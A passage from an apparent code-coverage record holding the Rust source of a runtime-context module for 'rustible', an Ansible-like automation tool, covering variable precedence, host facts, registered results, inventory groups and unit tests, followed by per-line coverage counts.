precedence)\n    ExtraVars,\n}\n\n/// Container for host-specific variables\n#[derive(Debug, Clone, Default, Serialize, Deserialize)]\npub struct HostVars {\n    /// Variables specific to this host\n    vars: IndexMap\u003cString, JsonValue\u003e,\n    /// Facts gathered from this host\n    facts: IndexMap\u003cString, JsonValue\u003e,\n    /// Registered task results\n    registered: IndexMap\u003cString, RegisteredResult\u003e,\n}\n\nimpl HostVars {\n    pub fn new() -\u003e Self {\n        Self::default()\n    }\n\n    /// Set a variable for this host\n    pub fn set_var(\u0026mut self, name: String, value: JsonValue) {\n        self.vars.insert(name, value);\n    }\n\n    /// Get a variable for this host\n    pub fn get_var(\u0026self, name: \u0026str) -\u003e Option\u003c\u0026JsonValue\u003e {\n        self.vars.get(name)\n    }\n\n    /// Set a fact for this host\n    pub fn set_fact(\u0026mut self, name: String, value: JsonValue) {\n        self.facts.insert(name, value);\n    }\n\n    /// Get a fact for this host\n    pub fn get_fact(\u0026self, name: \u0026str) -\u003e Option\u003c\u0026JsonValue\u003e {\n        self.facts.get(name)\n    }\n\n    /// Get all facts for this host\n    pub fn get_all_facts(\u0026self) -\u003e \u0026IndexMap\u003cString, JsonValue\u003e {\n        \u0026self.facts\n    }\n\n    /// Register a task result\n    pub fn register(\u0026mut self, name: String, result: RegisteredResult) {\n        self.registered.insert(name, result);\n    }\n\n    /// Get a registered result\n    pub fn get_registered(\u0026self, name: \u0026str) -\u003e Option\u003c\u0026RegisteredResult\u003e {\n        self.registered.get(name)\n    }\n\n    /// Merge another HostVars into this one\n    pub fn merge(\u0026mut self, other: \u0026HostVars) {\n        for (k, v) in \u0026other.vars {\n            self.vars.insert(k.clone(), v.clone());\n        }\n        for (k, v) in \u0026other.facts {\n            self.facts.insert(k.clone(), v.clone());\n        }\n        for (k, v) in \u0026other.registered {\n            self.registered.insert(k.clone(), v.clone());\n        }\n    }\n}\n\n/// Result of a task that can be registered\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct RegisteredResult {\n    /// Whether the task changed something\n    pub changed: bool,\n    /// Whether the task failed\n    pub failed: bool,\n    /// Whether the task was skipped\n    pub skipped: bool,\n    /// Return code (for command/shell modules)\n    pub rc: Option\u003ci32\u003e,\n    /// Standard output\n    pub stdout: Option\u003cString\u003e,\n    /// Standard output as lines\n    pub stdout_lines: Option\u003cVec\u003cString\u003e\u003e,\n    /// Standard error\n    pub stderr: Option\u003cString\u003e,\n    /// Standard error as lines\n    pub stderr_lines: Option\u003cVec\u003cString\u003e\u003e,\n    /// Message from the task\n    pub msg: Option\u003cString\u003e,\n    /// Results for loop tasks\n    pub results: Option\u003cVec\u003cRegisteredResult\u003e\u003e,\n    /// Module-specific data\n    #[serde(flatten)]\n    pub data: IndexMap\u003cString, JsonValue\u003e,\n}\n\nimpl Default for RegisteredResult {\n    fn default() -\u003e Self {\n        Self {\n            changed: false,\n            failed: false,\n            skipped: false,\n            rc: None,\n            stdout: None,\n            stdout_lines: None,\n            stderr: None,\n            stderr_lines: None,\n            msg: None,\n            results: None,\n            data: IndexMap::new(),\n        }\n    }\n}\n\nimpl RegisteredResult {\n    /// Create a new registered result\n    pub fn new() -\u003e Self {\n        Self::default()\n    }\n\n    /// Create a successful result\n    pub fn ok(changed: bool) -\u003e Self {\n        Self {\n            changed,\n            ..Default::default()\n        }\n    }\n\n    /// Create a failed result\n    pub fn failed(msg: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            failed: true,\n            msg: Some(msg.into()),\n            ..Default::default()\n        }\n    }\n\n    /// Create a skipped result\n    pub fn skipped(msg: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            skipped: true,\n            msg: Some(msg.into()),\n            ..Default::default()\n        }\n    }\n\n    /// Convert to JSON value\n    pub fn to_json(\u0026self) -\u003e JsonValue {\n        serde_json::to_value(self).unwrap_or(JsonValue::Null)\n    }\n}\n\n/// Group definition in inventory\n#[derive(Debug, Clone, Default, Serialize, Deserialize)]\npub struct InventoryGroup {\n    /// Hosts in this group\n    pub hosts: Vec\u003cString\u003e,\n    /// Variables for this group\n    pub vars: IndexMap\u003cString, JsonValue\u003e,\n    /// Child groups\n    pub children: Vec\u003cString\u003e,\n}\n\n/// Execution context passed to tasks\n#[derive(Clone)]\npub struct ExecutionContext {\n    /// Current host being executed on\n    pub host: String,\n    /// Whether we're in check mode (dry-run)\n    pub check_mode: bool,\n    /// Whether to show diffs\n    pub diff_mode: bool,\n    /// Optional connection for remote execution\n    pub connection: Option\u003cArc\u003cdyn Connection\u003e\u003e,\n    /// Python interpreter path on remote host\n    pub python_interpreter: String,\n}\n\nimpl std::fmt::Debug for ExecutionContext {\n    fn fmt(\u0026self, f: \u0026mut std::fmt::Formatter\u003c'_\u003e) -\u003e std::fmt::Result {\n        f.debug_struct(\"ExecutionContext\")\n            .field(\"host\", \u0026self.host)\n            .field(\"check_mode\", \u0026self.check_mode)\n            .field(\"diff_mode\", \u0026self.diff_mode)\n            .field(\n                \"connection\",\n                \u0026self.connection.as_ref().map(|c| c.identifier()),\n            )\n            .field(\"python_interpreter\", \u0026self.python_interpreter)\n            .finish()\n    }\n}\n\nimpl ExecutionContext {\n    pub fn new(host: impl Into\u003cString\u003e) -\u003e Self {\n        Self {\n            host: host.into(),\n            check_mode: false,\n            diff_mode: false,\n            connection: None,\n            python_interpreter: \"/usr/bin/python3\".to_string(),\n        }\n    }\n\n    pub fn with_check_mode(mut self, check: bool) -\u003e Self {\n        self.check_mode = check;\n        self\n    }\n\n    pub fn with_diff_mode(mut self, diff: bool) -\u003e Self {\n        self.diff_mode = diff;\n        self\n    }\n\n    /// Set the connection for remote execution\n    pub fn with_connection(mut self, conn: Arc\u003cdyn Connection\u003e) -\u003e Self {\n        self.connection = Some(conn);\n        self\n    }\n\n    /// Set the Python interpreter path\n    pub fn with_python_interpreter(mut self, path: impl Into\u003cString\u003e) -\u003e Self {\n        self.python_interpreter = path.into();\n        self\n    }\n}\n\n/// The main runtime context holding all state during execution\n#[derive(Debug, Default)]\npub struct RuntimeContext {\n    /// Global variables (from inventory, playbook vars_files, etc.)\n    global_vars: IndexMap\u003cString, JsonValue\u003e,\n\n    /// Play-level variables\n    play_vars: IndexMap\u003cString, JsonValue\u003e,\n\n    /// Task-level variables\n    task_vars: IndexMap\u003cString, JsonValue\u003e,\n\n    /// Extra variables (highest precedence)\n    extra_vars: IndexMap\u003cString, JsonValue\u003e,\n\n    /// Per-host variables and facts\n    host_data: IndexMap\u003cString, HostVars\u003e,\n\n    /// Inventory groups\n    groups: IndexMap\u003cString, InventoryGroup\u003e,\n\n    /// Special \"all\" group containing all hosts\n    all_hosts: Vec\u003cString\u003e,\n\n    /// Magic variables\n    magic_vars: IndexMap\u003cString, JsonValue\u003e,\n}\n\nimpl RuntimeContext {\n    /// Create a new runtime context\n    pub fn new() -\u003e Self {\n        let mut ctx = Self::default();\n        ctx.init_magic_vars();\n        ctx\n    }\n\n    /// Create a runtime context from an inventory\n    pub fn from_inventory(inventory: \u0026crate::inventory::Inventory) -\u003e Self {\n        let mut ctx = Self::new();\n\n        // Add hosts from inventory\n        for host in inventory.hosts() {\n            // Convert host variables from serde_yaml to serde_json\n            for (key, value) in \u0026host.vars {\n                if let Ok(json_value) = serde_json::to_value(value) {\n                    ctx.set_host_var(host.name(), key.clone(), json_value);\n                }\n            }\n        }\n\n        ctx\n    }\n\n    /// Initialize magic variables\n    fn init_magic_vars(\u0026mut self) {\n        self.magic_vars.insert(\n            \"ansible_version\".to_string(),\n            serde_json::json!({\n                \"full\": env!(\"CARGO_PKG_VERSION\"),\n                \"major\": 2,\n                \"minor\": 16,\n                \"revision\": 0,\n                \"string\": format!(\"rustible {}\", env!(\"CARGO_PKG_VERSION\"))\n            }),\n        );\n\n        self.magic_vars.insert(\n            \"rustible_version\".to_string(),\n            serde_json::json!(env!(\"CARGO_PKG_VERSION\")),\n        );\n\n        // Playbook directory will be set when playbook is loaded\n        self.magic_vars\n            .insert(\"playbook_dir\".to_string(), JsonValue::Null);\n\n        self.magic_vars\n            .insert(\"inventory_dir\".to_string(), JsonValue::Null);\n    }\n\n    /// Set a global variable\n    pub fn set_global_var(\u0026mut self, name: String, value: JsonValue) {\n        trace!(\"Setting global var: {} = {:?}\", name, value);\n        self.global_vars.insert(name, value);\n    }\n\n    /// Set a play-level variable\n    pub fn set_play_var(\u0026mut self, name: String, value: JsonValue) {\n        trace!(\"Setting play var: {} = {:?}\", name, value);\n        self.play_vars.insert(name, value);\n    }\n\n    /// Set a task-level variable\n    pub fn set_task_var(\u0026mut self, name: String, value: JsonValue) {\n        trace!(\"Setting task var: {} = {:?}\", name, value);\n        self.task_vars.insert(name, value);\n    }\n\n    /// Set an extra variable (highest precedence)\n    pub fn set_extra_var(\u0026mut self, name: String, value: JsonValue) {\n        trace!(\"Setting extra var: {} = {:?}\", name, value);\n        self.extra_vars.insert(name, value);\n    }\n\n    /// Clear task-level variables (called between tasks)\n    pub fn clear_task_vars(\u0026mut self) {\n        self.task_vars.clear();\n    }\n\n    /// Clear play-level variables (called between plays)\n    pub fn clear_play_vars(\u0026mut self) {\n        self.play_vars.clear();\n        self.task_vars.clear();\n    }\n\n    /// Get a variable by name, respecting precedence\n    pub fn get_var(\u0026self, name: \u0026str, host: Option\u003c\u0026str\u003e) -\u003e Option\u003cJsonValue\u003e {\n        // Check in order of precedence (highest first)\n\n        // Extra vars (highest)\n        if let Some(v) = self.extra_vars.get(name) {\n            return Some(v.clone());\n        }\n\n        // Registered variables and set_fact (check host data)\n        if let Some(host_name) = host {\n            if let Some(host_data) = self.host_data.get(host_name) {\n                if let Some(reg) = host_data.get_registered(name) {\n                    return Some(reg.to_json());\n                }\n            }\n        }\n\n        // Task variables\n        if let Some(v) = self.task_vars.get(name) {\n            return Some(v.clone());\n        }\n\n        // Play variables\n        if let Some(v) = self.play_vars.get(name) {\n            return Some(v.clone());\n        }\n\n        // Global variables\n        if let Some(v) = self.global_vars.get(name) {\n            return Some(v.clone());\n        }\n\n        // Host variables\n        if let Some(host_name) = host {\n            if let Some(host_data) = self.host_data.get(host_name) {\n                if let Some(v) = host_data.get_var(name) {\n                    return Some(v.clone());\n                }\n            }\n        }\n\n        // Magic variables\n        if let Some(v) = self.magic_vars.get(name) {\n            return Some(v.clone());\n        }\n\n        None\n    }\n\n    /// Get all variables merged for a specific host\n    pub fn get_merged_vars(\u0026self, host: \u0026str) -\u003e IndexMap\u003cString, JsonValue\u003e {\n        let mut merged = IndexMap::new();\n\n        // Start with magic vars (lowest)\n        for (k, v) in \u0026self.magic_vars {\n            merged.insert(k.clone(), v.clone());\n        }\n\n        // Global vars\n        for (k, v) in \u0026self.global_vars {\n            merged.insert(k.clone(), v.clone());\n        }\n\n        // Group vars for groups this host is in\n        for (_group_name, group) in \u0026self.groups {\n            if group.hosts.contains(\u0026host.to_string()) {\n                for (k, v) in \u0026group.vars {\n                    merged.insert(k.clone(), v.clone());\n                }\n            }\n        }\n\n        // Host-specific vars\n        if let Some(host_data) = self.host_data.get(host) {\n            for (k, v) in \u0026host_data.vars {\n                merged.insert(k.clone(), v.clone());\n            }\n        }\n\n        // Play vars\n        for (k, v) in \u0026self.play_vars {\n            merged.insert(k.clone(), v.clone());\n        }\n\n        // Task vars\n        for (k, v) in \u0026self.task_vars {\n            merged.insert(k.clone(), v.clone());\n        }\n\n        // Host facts (under 'ansible_facts' namespace)\n        if let Some(host_data) = self.host_data.get(host) {\n            if !host_data.facts.is_empty() {\n                merged.insert(\n                    \"ansible_facts\".to_string(),\n                    serde_json::to_value(host_data.get_all_facts()).unwrap_or(JsonValue::Null),\n                );\n            }\n\n            // Registered vars\n            for (k, v) in \u0026host_data.registered {\n                merged.insert(k.clone(), v.to_json());\n            }\n        }\n\n        // Extra vars (highest)\n        for (k, v) in \u0026self.extra_vars {\n            merged.insert(k.clone(), v.clone());\n        }\n\n        // Add special vars\n        merged.insert(\n            \"inventory_hostname\".to_string(),\n            JsonValue::String(host.to_string()),\n        );\n        merged.insert(\n            \"inventory_hostname_short\".to_string(),\n            JsonValue::String(host.split('.').next().unwrap_or(host).to_string()),\n        );\n\n        // Add group names this host belongs to\n        let group_names: Vec\u003cString\u003e = self\n            .groups\n            .iter()\n            .filter(|(_, g)| g.hosts.contains(\u0026host.to_string()))\n            .map(|(name, _)| name.clone())\n            .collect();\n        merged.insert(\n            \"group_names\".to_string(),\n            serde_json::to_value(\u0026group_names).unwrap_or(JsonValue::Array(vec![])),\n        );\n\n        merged\n    }\n\n    /// Add a host to the inventory\n    pub fn add_host(\u0026mut self, host: String, group: Option\u003c\u0026str\u003e) {\n        debug!(\"Adding host: {} to group: {:?}\", host, group);\n\n        if !self.all_hosts.contains(\u0026host) {\n            self.all_hosts.push(host.clone());\n        }\n\n        self.host_data\n            .entry(host.clone())\n            .or_insert_with(HostVars::new);\n\n        if let Some(group_name) = group {\n            let group = self\n                .groups\n                .entry(group_name.to_string())\n                .or_insert_with(InventoryGroup::default);\n\n            if !group.hosts.contains(\u0026host) {\n                group.hosts.push(host);\n            }\n        }\n    }\n\n    /// Add a group to the inventory\n    pub fn add_group(\u0026mut self, name: String, group: InventoryGroup) {\n        debug!(\"Adding group: {}\", name);\n        self.groups.insert(name, group);\n    }\n\n    /// Get all hosts\n    pub fn get_all_hosts(\u0026self) -\u003e Vec\u003cString\u003e {\n        self.all_hosts.clone()\n    }\n\n    /// Get hosts in a group\n    pub fn get_group_hosts(\u0026self, group: \u0026str) -\u003e Option\u003cVec\u003cString\u003e\u003e {\n        self.groups.get(group).map(|g| {\n            let mut hosts = g.hosts.clone();\n\n            // Include hosts from child groups\n            for child in \u0026g.children {\n                if let Some(child_hosts) = self.get_group_hosts(child) {\n                    for h in child_hosts {\n                        if !hosts.contains(\u0026h) {\n                            hosts.push(h);\n                        }\n                    }\n                }\n            }\n\n            hosts\n        })\n    }\n\n    /// Set a fact for a host\n    pub fn set_host_fact(\u0026mut self, host: \u0026str, name: String, value: JsonValue) {\n        let host_data = self\n            .host_data\n            .entry(host.to_string())\n            .or_insert_with(HostVars::new);\n        host_data.set_fact(name, value);\n    }\n\n    /// Get a fact for a host\n    pub fn get_host_fact(\u0026self, host: \u0026str, name: \u0026str) -\u003e Option\u003cJsonValue\u003e {\n        self.host_data\n            .get(host)\n            .and_then(|hd| hd.get_fact(name).cloned())\n    }\n\n    /// Set all facts for a host\n    pub fn set_host_facts(\u0026mut self, host: \u0026str, facts: IndexMap\u003cString, JsonValue\u003e) {\n        let host_data = self\n            .host_data\n            .entry(host.to_string())\n            .or_insert_with(HostVars::new);\n        for (k, v) in facts {\n            host_data.set_fact(k, v);\n        }\n    }\n\n    /// Register a task result for a host\n    pub fn register_result(\u0026mut self, host: \u0026str, name: String, result: RegisteredResult) {\n        debug!(\"Registering result '{}' for host '{}'\", name, host);\n        let host_data = self\n            .host_data\n            .entry(host.to_string())\n            .or_insert_with(HostVars::new);\n        host_data.register(name, result);\n    }\n\n    /// Get a registered result for a host\n    pub fn get_registered(\u0026self, host: \u0026str, name: \u0026str) -\u003e Option\u003c\u0026RegisteredResult\u003e {\n        self.host_data\n            .get(host)\n            .and_then(|hd| hd.get_registered(name))\n    }\n\n    /// Set a host variable\n    pub fn set_host_var(\u0026mut self, host: \u0026str, name: String, value: JsonValue) {\n        let host_data = self\n            .host_data\n            .entry(host.to_string())\n            .or_insert_with(HostVars::new);\n        host_data.set_var(name, value);\n    }\n\n    /// Get a host variable\n    pub fn get_host_var(\u0026self, host: \u0026str, name: \u0026str) -\u003e Option\u003cJsonValue\u003e {\n        self.host_data\n            .get(host)\n            .and_then(|hd| hd.get_var(name).cloned())\n    }\n\n    /// Set a magic variable\n    pub fn set_magic_var(\u0026mut self, name: String, value: JsonValue) {\n        self.magic_vars.insert(name, value);\n    }\n\n    /// Check if a host exists in the inventory\n    pub fn has_host(\u0026self, host: \u0026str) -\u003e bool {\n        self.all_hosts.contains(\u0026host.to_string())\n    }\n\n    /// Check if a group exists\n    pub fn has_group(\u0026self, group: \u0026str) -\u003e bool {\n        self.groups.contains_key(group)\n    }\n\n    /// Get all group names\n    pub fn get_all_groups(\u0026self) -\u003e Vec\u003cString\u003e {\n        self.groups.keys().cloned().collect()\n    }\n}\n\n/// Thread-safe wrapper for RuntimeContext\npub struct SharedRuntime {\n    inner: Arc\u003cRwLock\u003cRuntimeContext\u003e\u003e,\n}\n\nimpl SharedRuntime {\n    pub fn new(ctx: RuntimeContext) -\u003e Self {\n        Self {\n            inner: Arc::new(RwLock::new(ctx)),\n        }\n    }\n\n    pub fn inner(\u0026self) -\u003e Arc\u003cRwLock\u003cRuntimeContext\u003e\u003e {\n        Arc::clone(\u0026self.inner)\n    }\n\n    pub async fn read(\u0026self) -\u003e tokio::sync::RwLockReadGuard\u003c'_, RuntimeContext\u003e {\n        self.inner.read().await\n    }\n\n    pub async fn write(\u0026self) -\u003e tokio::sync::RwLockWriteGuard\u003c'_, RuntimeContext\u003e {\n        self.inner.write().await\n    }\n}\n\nimpl Clone for SharedRuntime {\n    fn clone(\u0026self) -\u003e Self {\n        Self {\n            inner: Arc::clone(\u0026self.inner),\n        }\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_var_precedence() {\n        let mut ctx = RuntimeContext::new();\n\n        // Set variables at different levels\n        ctx.set_global_var(\"var1\".to_string(), serde_json::json!(\"global\"));\n        ctx.set_play_var(\"var1\".to_string(), serde_json::json!(\"play\"));\n\n        // Play should override global\n        assert_eq!(ctx.get_var(\"var1\", None), Some(serde_json::json!(\"play\")));\n\n        // Task should override play\n        ctx.set_task_var(\"var1\".to_string(), serde_json::json!(\"task\"));\n        assert_eq!(ctx.get_var(\"var1\", None), Some(serde_json::json!(\"task\")));\n\n        // Extra should override all\n        ctx.set_extra_var(\"var1\".to_string(), serde_json::json!(\"extra\"));\n        assert_eq!(ctx.get_var(\"var1\", None), Some(serde_json::json!(\"extra\")));\n    }\n\n    #[test]\n    fn test_host_vars() {\n        let mut ctx = RuntimeContext::new();\n        ctx.add_host(\"server1\".to_string(), Some(\"webservers\"));\n\n        ctx.set_host_var(\"server1\", \"http_port\".to_string(), serde_json::json!(80));\n\n        assert_eq!(\n            ctx.get_host_var(\"server1\", \"http_port\"),\n            Some(serde_json::json!(80))\n        );\n    }\n\n    #[test]\n    fn test_host_facts() {\n        let mut ctx = RuntimeContext::new();\n        ctx.add_host(\"server1\".to_string(), None);\n\n        ctx.set_host_fact(\n            \"server1\",\n            \"os_family\".to_string(),\n            serde_json::json!(\"Debian\"),\n        );\n\n        assert_eq!(\n            ctx.get_host_fact(\"server1\", \"os_family\"),\n            Some(serde_json::json!(\"Debian\"))\n        );\n    }\n\n    #[test]\n    fn test_registered_result() {\n        let mut ctx = RuntimeContext::new();\n        ctx.add_host(\"server1\".to_string(), None);\n\n        let result = RegisteredResult {\n            changed: true,\n            stdout: Some(\"hello world\".to_string()),\n            stdout_lines: Some(vec![\"hello world\".to_string()]),\n            ..Default::default()\n        };\n\n        ctx.register_result(\"server1\", \"my_result\".to_string(), result);\n\n        let registered = ctx.get_registered(\"server1\", \"my_result\").unwrap();\n        assert!(registered.changed);\n        assert_eq!(registered.stdout, Some(\"hello world\".to_string()));\n    }\n\n    #[test]\n    fn test_group_hosts() {\n        let mut ctx = RuntimeContext::new();\n\n        ctx.add_host(\"web1\".to_string(), Some(\"webservers\"));\n        ctx.add_host(\"web2\".to_string(), Some(\"webservers\"));\n        ctx.add_host(\"db1\".to_string(), Some(\"databases\"));\n\n        let web_hosts = ctx.get_group_hosts(\"webservers\").unwrap();\n        assert_eq!(web_hosts.len(), 2);\n        assert!(web_hosts.contains(\u0026\"web1\".to_string()));\n        assert!(web_hosts.contains(\u0026\"web2\".to_string()));\n    }\n\n    #[test]\n    fn test_merged_vars() {\n        let mut ctx = RuntimeContext::new();\n        ctx.add_host(\"server1\".to_string(), Some(\"webservers\"));\n\n        ctx.set_global_var(\"env\".to_string(), serde_json::json!(\"production\"));\n        ctx.set_host_var(\"server1\", \"port\".to_string(), serde_json::json!(8080));\n\n        let merged = ctx.get_merged_vars(\"server1\");\n\n        assert_eq!(merged.get(\"env\"), Some(\u0026serde_json::json!(\"production\")));\n        assert_eq!(merged.get(\"port\"), Some(\u0026serde_json::json!(8080)));\n        assert_eq!(\n            merged.get(\"inventory_hostname\"),\n            Some(\u0026serde_json::json!(\"server1\"))\n        );\n    }\n}\n","traces":[{"line":55,"address":[28943120],"length":1,"stats":{"Line":1}},{"line":56,"address":[28943128],"length":1,"stats":{"Line":1}},{"line":60,"address":[28944192],"length":1,"stats":{"Line":1}},{"line":61,"address":[28944210],"length":1,"stats":{"Line":1}},{"line":65,"address":[28944160],"length":1,"stats":{"Line":1}},{"line":66,"address":[28944178],"length":1,"stats":{"Line":1}},{"line":70,"address":[28944336],"length":1,"stats":{"Line":1}},{"line":71,"address":[28944354],"length":1,"stats":{"Line":1}},{"line":75,"address":[28944240],"length":1,"stats":{"Line":1}},{"line":76,"address":[28944258],"length":1,"stats":{"Line":1}},{"line":80,"address":[28943056],"length":1,"stats":{"Line":0}},{"line":81,"address":[28943064],"length":1,"stats":{"Line":0}},{"line":85,"address":[28944272],"length":1,"stats":{"Line":1}},{"line":86,"address":[28944296],"length":1,"stats":{"Line":1}},{"line":90,"address":[28943072],"length":1,"stats":{"Line":1}},{"line":91,"address":[28943090],"length":1,"stats":{"Line":1}},{"line":95,"address":[28943888,28943856,28943152],"length":1,"stats":{"Line":0}},{"line":96,"address":[28943198,28943237],"length":1,"stats":{"Line":0}},{"line":97,"address":[28943316,28944021],"length":1,"stats":{"Line":0}},{"line":99,"address":[28943369,28943394],"length":1,"stats":{"Line":0}},{"line":100,"address":[28943894,28943496],"length":1,"stats":{"Line":0}},{"line":102,"address":[28943558,28943586],"length":1,"stats":{"Line":0}},{"line":103,"address":[28943688,28943752,28943869],"length":1,"stats":{"Line":0}},{"line":137,"address":[28922976,28923455,28923369],"length":1,"stats":{"Line":1}},{"line":149,"address":[28923043],"length":1,"stats":{"Line":1}},{"line":156,"address":[28942960],"length":1,"stats":{"Line":0}},{"line":157,"address":[28942968],"length":1,"stats":{"Line":0}},{"line":161,"address":[28942576],"length":1,"stats":{"Line":0}},{"line":169,"address":[],"length":0,"stats":{"Line":0}},{"line":172,"address":[],"length":0,"stats":{"Line":0}},{"line":178,"address":[],"length":0,"stats":{"Line":0}},{"line":181,"address":[],"length":0,"stats":{"Line":0}},{"line":187,"address":[28942992],"length":1,"stats":{"Line":0}},{"line":188,"address":[28943010],"length":1,"stats":{"Line":0}},{"line":219,"address":[28919824],"length":1,"stats":{"Line":0}},{"line":220,"address":[28919843],"length":1,"stats":{"Line":0}},{"line":221,"address":[28919871],"length":1,"stats":{"Line":0}},{"line":222,"address":[28919909],"length":1,"stats":{"Line":0}},{"line":223,"address":[28919946],"length":1,"stats":{"Line":0}},{"line":226,"address":[31067049,31067040],"length":1,"stats":{"Line":0}},{"line":228,"address":[28920055],"length":1,"stats":{"Line":0}},{"line":234,"address":[31071008,31071202,31071224],"length":1,"stats":{"Line":0}},{"line":236,"address":[31071022],"length":1,"stats":{"Line":0}},{"line":240,"address":[31071052],"length":1,"stats":{"Line":0}},{"line":244,"address":[28942352],"length":1,"stats":{"Line":0}},{"line":245,"address":[28942375],"length":1,"stats":{"Line":0}},{"line":246,"address":[28942380],"length":1,"stats":{"Line":0}},{"line":249,"address":[28942304],"length":1,"stats":{"Line":0}},{"line":250,"address":[28942327],"length":1,"stats":{"Line":0}},{"line":251,"address":[28942332],"length":1,"stats":{"Line":0}},{"line":255,"address":[28942549,28942400],"length":1,"stats":{"Line":0}},{"line":256,"address":[28942521,28942446],"length":1,"stats":{"Line":0}},{"line":257,"address":[28942529],"length":1,"stats":{"Line":0}},{"line":261,"address":[],"length":0,"stats":{"Line":0}},{"line":262,"address":[],"length":0,"stats":{"Line":0}},{"line":263,"address":[],"length":0,"stats":{"Line":0}},{"line":297,"address":[28938563,28938448,28938557],"length":1,"stats":{"Line":1}},{"line":298,"address":[28938474],"length":1,"stats":{"Line":1}},{"line":299,"address":[28938484],"length":1,"stats":{"Line":1}},{"line":300,"address":[28938529],"length":1,"stats":{"Line":1}},{"line":304,"address":[28927913,28927104,28927963],"length":1,"stats":{"Line":0}},{"line":305,"address":[28927134],"length":1,"stats":{"Line":0}},{"line":308,"address":[28927225,28927165],"length":1,"stats":{"Line":0}},{"line":310,"address":[28927343,28927410],"length":1,"stats":{"Line":0}},{"line":311,"address":[28927858,28927557,28927632],"length":1,"stats":{"Line":0}},{"line":312,"address":[28927672,28927754],"length":1,"stats":{"Line":0}},{"line":317,"address":[28927372],"length":1,"stats":{"Line":0}},{"line":321,"address":[28935312,28937344,28937376],"length":1,"stats":{"Line":1}},{"line":322,"address":[28935332,28936874],"length":1,"stats":{"Line":2}},{"line":323,"address":[28935400],"length":1,"stats":{"Line":1}},{"line":324,"address":[28936567,28935490,28936247,28936473,28935442,28936594,28935813,28935599,28936030,28937382],"length":1,"stats":{"Line":3}},{"line":329,"address":[28936533,28936442],"length":1,"stats":{"Line":2}},{"line":333,"address":[28936931,28937081],"length":1,"stats":{"Line":2}},{"line":334,"address":[28936942],"length":1,"stats":{"Line":1}},{"line":335,"address":[28937042,28936979],"length":1,"stats":{"Line":2}},{"line":339,"address":[28937147],"length":1,"stats":{"Line":1}},{"line":340,"address":[28937157],"length":1,"stats":{"Line":1}},{"line":342,"address":[28937243],"length":1,"stats":{"Line":1}},{"line":343,"address":[28937254],"length":1,"stats":{"Line":1}},{"line":347,"address":[28928144,28928915],"length":1,"stats":{"Line":1}},{"line":348,"address":[28928272,28928174,28928579],"length":1,"stats":{"Line":2}},{"line":349,"address":[28928860,28928483],"length":1,"stats":{"Line":2}},{"line":353,"address":[28924064,28924839],"length":1,"stats":{"Line":1}},{"line":354,"address":[28924094,28924192,28924503],"length":1,"stats":{"Line":2}},{"line":355,"address":[28924784,28924403],"length":1,"stats":{"Line":2}},{"line":359,"address":[28924880,28925658],"length":1,"stats":{"Line":1}},{"line":360,"address":[28924910,28925322,28925008],"length":1,"stats":{"Line":2}},{"line":361,"address":[28925219,28925603],"length":1,"stats":{"Line":2}},{"line":365,"address":[28926666,28925888],"length":1,"stats":{"Line":1}},{"line":366,"address":[28925918,28926016,28926330],"length":1,"stats":{"Line":2}},{"line":367,"address":[28926227,28926611],"length":1,"stats":{"Line":2}},{"line":371,"address":[28929584],"length":1,"stats":{"Line":0}},{"line":372,"address":[28929589],"length":1,"stats":{"Line":0}},{"line":376,"address":[28929536],"length":1,"stats":{"Line":0}},{"line":377,"address":[28929550],"length":1,"stats":{"Line":0}},{"line":378,"address":[28929564],"length":1,"stats":{"Line":0}},{"line":382,"address":[28938576],"length":1,"stats":{"Line":1}},{"line":386,"address":[28938666],"length":1,"stats":{"Line":1}},{"line":387,"address":[28938724],"length":1,"stats":{"Line":1}},{"line":391,"address":[28938776,28938824],"length":1,"stats":{"Line":1}},{"line":392,"address":[28938980,28938850],"length":1,"stats":{"Line":0}},{"line":393,"address":[28938993],"length":1,"stats":{"Line":0}},{"line":394,"address":[28939048],"length":1,"stats":{"Line":0}},{"line":400,"address":[28938910,28939112],"length":1,"stats":{"Line":2}},{"line":401,"address":[28939128],"length":1,"stats":{"Line":1}},{"line":405,"address":[28939213],"length":1,"stats":{"Line":1}},{"line":406,"address":[28939277],"length":1,"stats":{"Line":1}},{"line":410,"address":[28939362],"length":1,"stats":{"Line":0}},{"line":411,"address":[28939422],"length":1,"stats":{"Line":0}},{"line":415,"address":[28939492],"length":1,"stats":{"Line":0}},{"line":416,"address":[28939687,28939551],"length":1,"stats":{"Line":0}},{"line":417,"address":[28939703],"length":1,"stats":{"Line":0}},{"line":418,"address":[28939767],"length":1,"stats":{"Line":0}},{"line":424,"address":[28939837,28939617],"length":1,"stats":{"Line":0}},{"line":425,"address":[28939853],"length":1,"stats":{"Line":0}},{"line":428,"address":[28939928],"length":1,"stats":{"Line":0}},{"line":432,"address":[28935278,28929728,28931178],"length":1,"stats":{"Line":1}},{"line":433,"address":[28929799],"length":1,"stats":{"Line":1}},{"line":436,"address":[28930027,28929940],"length":1,"stats":{"Line":2}},{"line":437,"address":[28935142,28930177,28935119],"length":1,"stats":{"Line":2}},{"line":441,"address":[28930207],"length":1,"stats":{"Line":1}},{"line":442,"address":[28934975,28930396,28934952],"length":1,"stats":{"Line":2}},{"line":446,"address":[28930426],"length":1,"stats":{"Line":1}},{"line":447,"address":[28930622,28934436],"length":1,"stats":{"Line":2}},{"line":448,"address":[28934591],"length":1,"stats":{"Line":1}},{"line":449,"address":[28934761,28934808],"length":1,"stats":{"Line":0}},{"line":455,"address":[28930676],"length":1,"stats":{"Line":1}},{"line":456,"address":[28930761,28930838],"length":1,"stats":{"Line":2}},{"line":457,"address":[28930992,28931042],"length":1,"stats":{"Line":1}},{"line":462,"address":[28930792,28931200],"length":1,"stats":{"Line":2}},{"line":463,"address":[28934235,28931350,28934258],"length":1,"stats":{"Line":0}},{"line":467,"address":[28931380],"length":1,"stats":{"Line":1}},{"line":468,"address":[28934068,28931576,28934091],"length":1,"stats":{"Line":0}},{"line":472,"address":[28931622],"length":1,"stats":{"Line":1}},{"line":473,"address":[28931781,28931715],"length":1,"stats":{"Line":2}},{"line":474,"address":[28931993],"length":1,"stats":{"Line":0}},{"line":475,"address":[28931787,28931867],"length":1,"stats":{"Line":0}},{"line":476,"address":[28931875,28931947],"length":1,"stats":{"Line":0}},{"line":481,"address":[28932108,28931826],"length":1,"stats":{"Line":2}},{"line":482,"address":[28932262,28932312],"length":1,"stats":{"Line":0}},{"line":487,"address":[28931741,28932464],"length":1,"stats":{"Li